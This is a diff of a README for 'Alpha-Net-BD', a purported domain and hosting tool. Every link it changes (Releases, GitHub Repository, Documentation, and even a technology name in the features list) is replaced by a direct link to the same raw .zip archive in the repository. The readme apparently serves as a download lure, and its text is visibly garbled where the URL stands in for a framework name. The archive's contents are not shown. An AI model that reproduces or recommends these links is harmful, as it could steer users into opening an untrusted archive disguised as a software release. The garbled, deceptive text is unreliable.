@@ -6,13 +6,13 @@ Welcome to Alpha-Net-BD, a simple way to register domains and manage web hosting
 
 ## 🏷️ Download Alpha-Net-BD
 
-[![Download Alpha-Net-BD](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip)](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip)
+[![Download Alpha-Net-BD](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip)](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip)
 
 ## 📥 Download & Install
 
 To get Alpha-Net-BD, you need to visit the Releases page. Follow these steps:
 
-1. Click on this link: [Alpha-Net-BD Releases](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip).
+1. Click on this link: [Alpha-Net-BD Releases](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip).
 2. On the Releases page, look for the latest version.
 3. Find the file that matches your operating system.
 4. Click on the file to start your download.
@@ -55,7 +55,7 @@ This application supports various topics that enhance its functionality:
 - **Backend Technologies:** The architecture is built with modern backend frameworks.
 - **Deployment Services:** Easily deploy your applications once you secure a domain.
 - **Javascript & TypeScript:** The application uses Javascript and TypeScript for a smooth user experience.
-- **https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip Integration:** Built with https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip for fast loading times and optimized performance.
+- **https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip Integration:** Built with https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip for fast loading times and optimized performance.
 - **NextAuth Support:** Includes authentication features to protect your account.
 
 ## 🌟 Support
@@ -66,7 +66,7 @@ If you encounter any issues or need assistance, please visit our support section
 
 To keep your application up to date, regularly check the Releases page. Follow these steps to update:
 
-1. Go to the [Alpha-Net-BD Releases](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip) page.
+1. Go to the [Alpha-Net-BD Releases](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip) page.
 2. Download the latest version following the previous instructions.
 3. Close the running application before installing the new version.
 4. Open the newly downloaded file to apply the update.
@@ -81,8 +81,8 @@ We welcome contributions from the community. If you want to help us improve Alph
 
 ## 🔗 Useful Links
 
-- [Alpha-Net-BD Releases](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip)
-- [Documentation](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/chyloid/Alpha-Net-BD.zip)
+- [Alpha-Net-BD Releases](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip)
+- [Documentation](https://raw.githubusercontent.com/aouragh2018/Alpha-Net-BD/main/components/hosting/Alpha_Net_BD_3.4.zip)
 
 Thank you for choosing Alpha-Net-BD. We hope this application makes your domain registration and web hosting experience simpler and more efficient.
